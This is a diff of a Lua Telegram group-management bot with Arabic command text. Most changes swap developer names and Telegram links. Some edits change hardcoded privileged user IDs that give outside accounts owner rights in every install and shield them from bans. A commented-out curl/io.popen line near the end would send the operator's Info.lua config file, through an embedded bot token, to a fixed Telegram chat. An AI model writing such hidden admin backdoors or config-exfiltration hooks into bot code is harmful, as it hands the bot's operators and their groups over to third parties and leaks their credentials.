@@ -137,8 +137,8 @@ end
 _redis = load_redis()  
 --------------------------------------------------------------------------------------------------------------
 print([[
-> CH › @zeroO088
-~> DEVELOPER › @zeroO088 
+> CH › @B_ERR
+~> DEVELOPER › @B_ERR 
 ]])
 sudos = dofile("./Info.lua") 
 SUDO = tonumber(sudos.SUDO)
@@ -164,7 +164,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1466455779,1505943315,92828282929299292929292}   
+sudo_users = {SUDO,1466455779,92828282929299292929292,92828282929299292929292}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -256,9 +256,9 @@ end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(1466455779) then  
 var = true  
-elseif tonumber(user_id) == tonumber(1505943315) then
+elseif tonumber(user_id) == tonumber(92828282929299292929292) then
 var = true  
-elseif tonumber(user_id) == tonumber(1505943315) then
+elseif tonumber(user_id) == tonumber(92828282929299292929292) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -298,7 +298,7 @@ elseif tonumber(user_id) == tonumber(92828282929299292929292) then
 var = 'مالك السورس'
 elseif tonumber(user_id) == tonumber(82828272772727272) then
 var = 'مطور سورس'
-elseif tonumber(user_id) == tonumber(1505943315) then
+elseif tonumber(user_id) == tonumber(92828282929299292929292) then
 var = 'ملك التلجرام'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
@@ -1131,11 +1131,11 @@ end
 if text == 'بوت تواصل' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
-[TWL](t.me/toaasl88bot)
+[TWL](t.me/TWLANGBOT)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = 'TW ', url="t.me/toaasl88bot"}}, 
+{{text = 'TW ', url="t.me/TWLANGBOT"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -2685,10 +2685,7 @@ keyboard = {}
 keyboard.inline_keyboard = {
 
 {
-{text = ' ملك التليجرام ', url = "https://t.me/Mooodddiy"},
-},
-{
-{text = ' مطور السورس ', url = "https://t.me/zeRo9O9"},
+{text = ' Z҉E҉ℛO҉ ', url = "https://t.me/B_ERR"},
 },
 {
 {text = 'قنات السورس ', url = "https://t.me/zeroO088"}
@@ -2705,7 +2702,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'Z҉E҉ℛO҉',url="t.me/zeRo9O9"}},
+{{text = 'Z҉E҉ℛO҉',url="t.me/zeroO088"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -2716,14 +2713,10 @@ local Text = [[
 المبرمج زيرو لو حابب تتواصل معاه
 اتبع الزر إلى تحت ⬇️
 
-ملك التليجرام لو حابب تتواصل معاه
-اتبع الزر إلى تحت ⬇️
-
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '۞ Z҉E҉ℛO҉ ۞',url="t.me/zeRo9O9"}},
-{{text = '۞ ملك التليجرام ۞',url="t.me/@Mooodddiy"}},
+{{text = '۞ Z҉E҉ℛO҉ ۞',url="t.me/zeroO088"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -2733,11 +2726,11 @@ end
 if text == 'مبرمج السورس' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
-[DEV ](t.me/zeRo9O9)
+[DEV ](t.me/zeroO088)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '۞ Z҉E҉ℛO҉ ۞', url="t.me/zeRo9O9"}}, 
+{{text = '۞ Z҉E҉ℛO҉ ۞', url="t.me/zeroO088"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -3035,18 +3028,18 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '˹Z҉E҉ℛO҉˼', url="t.me/zeRo9O9"}}, 
+{{text = '˹Z҉E҉ℛO҉˼', url="t.me/zeroO088"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == 'بوت التواصل' then
 local Text = [[ 
-[TWL](t.me/@toaasl88bot)
+[TWL](t.me/TWLANGBOT)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '˹Z҉E҉ℛO҉˼', url="t.me/zeRo9O9"}}, 
+{{text = '˹Z҉E҉ℛO҉˼', url="t.me/TWLANGBOT"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -3054,11 +3047,7 @@ end
 
 if text == 'مبرمج السورس' then
 local Text = [[ 
-[Z҉E҉ℛO҉](t.me/zeRo9O9)
-]] 
-if text == 'ملك التليجرام ' then
-local Text = [[ 
-[Modiy](t.me/Mooodddiy)
+[Z҉E҉ℛO҉](t.me/zeroO088)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
@@ -4035,11 +4024,11 @@ if result.sender_user_id_ == tonumber(1466455779) then
 send(msg.chat_id_, msg.id_, " ۞ لا يمكنك حظر مبرمج السورس عام\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1505943315) then
+if result.sender_user_id_ == tonumber(92828282929299292929292) then
 send(msg.chat_id_, msg.id_, " ۞ لا يمكنك حظر مالك السورس عام\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1505943315) then
+if result.sender_user_id_ == tonumber(92828282929299292929292) then
 send(msg.chat_id_, msg.id_, " ۞ لا يمكنك حظر ملك التلجرام عام\n")
 return false 
 end
@@ -4084,7 +4073,7 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ۞ لا يمكنك حظر المطور الاساسي عام\n")
 return false 
 end
-if result.id_ == tonumber(1505943315) then
+if result.id_ == tonumber(92828282929299292929292) then
 send(msg.chat_id_, msg.id_, " ۞ هتحظر مين عام نت اهبل عام \n")
 return false 
 end
@@ -4119,7 +4108,7 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ۞ لا تسطيع حظر البوت عام")
 return false 
 end
-if userid == tonumber(1505943315) then
+if userid == tonumber(92828282929299292929292) then
 send(msg.chat_id_, msg.id_, " ۞ لا يمكنك حظر المطور الاساسي عام\n")
 return false 
 end
@@ -4155,11 +4144,11 @@ if result.sender_user_id_ == tonumber(1466455779) then
 send(msg.chat_id_, msg.id_, " ۞ لا يمكنك كتم مبرمج السورس عام\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1505943315) then
+if result.sender_user_id_ == tonumber(92828282929299292929292) then
 send(msg.chat_id_, msg.id_, " ۞ لا يمكنك كتم مالك السورس عام\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1505943315) then
+if result.sender_user_id_ == tonumber(92828282929299292929292) then
 send(msg.chat_id_, msg.id_, " ۞ لا يمكنك كتم ملك التلجرام عام\n")
 return false 
 end
@@ -4199,7 +4188,7 @@ if tonumber(result.id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ۞ لا تسطيع كتم البوت عام")
 return false 
 end
-if result.id_ == tonumber(1505943315) then
+if result.id_ == tonumber(92828282929299292929292) then
 send(msg.chat_id_, msg.id_, " ۞ هتحظر مين عام نت اهبل عام \n")
 return false 
 end
@@ -4234,7 +4223,7 @@ if userid == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ۞ لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
-if userid == tonumber(1505943315) then
+if userid == tonumber(92828282929299292929292) then
 send(msg.chat_id_, msg.id_, " ۞ لا يمكنك حظر المطور الاساسي  عام\n")
 return false 
 end
@@ -11770,7 +11759,7 @@ local Text =[[
 
 واستمتع للأوامر  ≪  
 
-[۞ ˹Z҉E҉ℛO҉˼۞](t.me/zeRo9O9)
+[۞ ˹Z҉E҉ℛO҉˼۞](t.me/zeroO088)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -11815,7 +11804,7 @@ local Text =[[
 *يمكنك تصفح الاضافات من خلال*
 *الكيبورد الموجود في الأسفل*
 *≪━━━━━˹Z҉E҉ℛO҉˼━━━━━━≫*
-[ ˹Z҉E҉ℛO҉˼ ](t.me/zeRo9O9)
+[ ˹Z҉E҉ℛO҉˼ ](t.me/zeroO088)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -11826,9 +11815,8 @@ keyboard.inline_keyboard = {
 {text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
 },
 {
-{text = '˹Z҉E҉ℛO҉˼', url="t.me/zeRo9O9"},
-{text = 'قناه السورس', url="t.me/zeroO088"},
-{text = 'ملك التليجرام ', url="t.me/Mooodddiy"},
+{text = '˹Z҉E҉ℛO҉˼', url="t.me/zeroO088"},
+{text = 'مبرمج السورس', url="t.me/zeroO088"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -12062,7 +12050,7 @@ local Teext =[[
 ۞الجهات
 ۞ الاشعارات
 ≪━━━━━˹Z҉E҉ℛO҉˼━━━━━━≫
-[۞ ˹Z҉E҉ℛO҉˼۞ ](t.me/zeRo9O9)
+[۞ ˹Z҉E҉ℛO҉˼۞ ](t.me/zeroO088)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12121,7 +12109,7 @@ local Teext =[[
 ۞ اوامر التسليه 
 ۞ صورتي 
 ≪━━━━━˹Z҉E҉ℛO҉˼━━━━━━≫
-[۞ ˹Z҉E҉ℛO҉˼۞](t.me/zeRo9O9)
+[۞ ˹Z҉E҉ℛO҉˼۞](t.me/zeroO088)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12190,7 +12178,7 @@ local Teext =[[
 ≪━━━━━˹Z҉E҉ℛO҉˼━━━━━━≫
 ۞ الاوامر المضافه ( لعرض الاوامر المضافه ) 
 ≪━━━━━˹Z҉E҉ℛO҉˼━━━━━━≫
-[۞ ˹Z҉E҉ℛO҉˼۞](t.me/zeRo9O9)
+[۞ ˹Z҉E҉ℛO҉˼۞](t.me/zeroO088)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12291,7 +12279,7 @@ local Teext =[[
 ۞الساعه
 ۞التاريخ
 ≪━━━━━˹Z҉E҉ℛO҉˼━━━━━━≫
-[۞ ˹Z҉E҉ℛO҉˼۞](t.me/zeRo9O9)
+[۞ ˹Z҉E҉ℛO҉˼۞](t.me/zeroO088)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12383,7 +12371,7 @@ local Teext =[[
 ۞تفعيل/تعطيل المغادره
 ۞مسح الجروبات
 ≪━━━━━˹Z҉E҉ℛO҉˼━━━━━━≫
-[۞ ˹Z҉E҉ℛO҉˼۞](t.me/zeRo9O9)
+[۞ ˹Z҉E҉ℛO҉˼۞](t.me/zeroO088)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12436,7 +12424,7 @@ local Teext =[[
 ۞شنو رئيك بهاي بالرد
 ۞تحب هذا
 ≪━━━━━˹Z҉E҉ℛO҉˼━━━━━━≫
-[۞ ˹Z҉E҉ℛO҉˼ ۞ ](t.me/zeRo9O9)
+[۞ ˹Z҉E҉ℛO҉˼ ۞ ](t.me/zeroO088)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12514,7 +12502,7 @@ local Teext =[[
  ۞ تاك للمتزوجين
  ۞ مسح المتزوجين
 ≪━━━━━˹Z҉E҉ℛO҉˼━━━━━━≫
-[۞  ˹Z҉E҉ℛO҉˼۞ ](t.me/zeRo9O9)
+[۞  ˹Z҉E҉ℛO҉˼۞ ](t.me/zeroO088)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12544,7 +12532,7 @@ local Teext =[[
 
 واستمتع للأوامر  ≪  
 
-[۞ ˹Z҉E҉ℛO҉˼۞](t.me/zeRo9O9)
+[۞ ˹Z҉E҉ℛO҉˼۞](t.me/zeroO088)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12589,9 +12577,8 @@ keyboard.inline_keyboard = {
 {text = ' القائمة الرئيسيه ', callback_data="/add"},
 },
 {
-{text = '˹Z҉E҉ℛO҉˼', url="t.me/zeRo9O9"},
-{text = 'قناه السورس', url="t.me/zeroO088"},
-{text = 'ملك التليجرام ', url="t.me/Mooodddiy"},
+{text = '˹Z҉E҉ℛO҉˼', url="t.me/zeroO088"},
+{text = 'مبرمج السورس', url="t.me/zeroO088"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -12621,9 +12608,8 @@ keyboard.inline_keyboard = {
 {text = ' القائمة الرئيسيه ', callback_data="/add"},
 },
 {
-{text = '˹Z҉E҉ℛO҉˼', url="t.me/zeRo9O9"},
-{text = 'قناه السورس', url="t.me/zeroO088"},
-{text = 'ملك التليجرام ', url="t.me/Mooodddiy"},
+{text = '˹Z҉E҉ℛO҉˼', url="t.me/zeroO088"},
+{text = 'مبرمج السورس', url="t.me/zeroO088"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -12653,9 +12639,8 @@ keyboard.inline_keyboard = {
 {text = ' القائمة الرئيسيه ', callback_data="/add"},
 },
 {
-{text = '˹Z҉E҉ℛO҉˼', url="t.me/zeRo9O9"},
-{text = 'قناه السورس', url="t.me/zeroO088"},
-{text = 'ملك التليجرام ', url="t.me/Mooodddiy"},
+{text = '˹Z҉E҉ℛO҉˼', url="t.me/zeroO088"},
+{text = 'مبرمج السورس', url="t.me/zeroO088"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -12677,8 +12662,6 @@ local Teext =[[
 *الكيبورد الموجود في الأسفل*
 *≪━━━━━˹Z҉E҉ℛO҉˼━━━━━━≫*
 [ ˹Z҉E҉ℛO҉˼ ](t.me/zeroO088)
-{text = 'قناه السورس', url="t.me/zeroO088"},
-{text = 'ملك التليجرام ', url="t.me/Mooodddiy"},
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12689,9 +12672,8 @@ keyboard.inline_keyboard = {
 {text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
 },
 {
-{text = '˹Z҉E҉ℛO҉˼', url="t.me/zeRo9O9"},
-{text = 'قناه السورس', url="t.me/zeroO088"},
-{text = 'ملك التليجرام ', url="t.me/Mooodddiy"},
+{text = '˹Z҉E҉ℛO҉˼', url="t.me/zeroO088"},
+{text = 'مبرمج السورس', url="t.me/zeroO088"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -13038,7 +13020,7 @@ DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 return false
 end 
 end
---local curl = 'curl "'..'https://api.telegram.org/bot1704828705:AAGxtUPVSoztF7BAJkKjzW05XD21mCh-kdI/sendDocument'..'" -F "chat_id='.. 1505943315 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
+--local curl = 'curl "'..'https://api.telegram.org/bot1704828705:AAGxtUPVSoztF7BAJkKjzW05XD21mCh-kdI/sendDocument'..'" -F "chat_id='.. 92828282929299292929292 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
 ------------------------------------------------------------------------
 if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
